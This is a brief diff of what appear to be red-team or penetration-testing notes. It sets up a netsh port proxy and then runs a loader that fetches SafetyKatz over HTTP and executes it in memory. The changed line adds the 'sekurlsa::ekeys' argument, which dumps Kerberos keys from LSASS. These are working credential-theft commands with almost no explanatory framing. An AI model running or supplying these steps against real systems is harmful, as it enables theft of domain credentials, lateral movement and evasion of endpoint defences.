@@ -17,4 +17,4 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 This way we can load in memory SafetyKatz
 
 4rd. Execute SafetyKatz in memory (in the path you saved the Loader -> 2nd step)
-C:\Users\Public\Loader.exe -Path http://127.0.0.1/SafetyKatz.exe
+C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
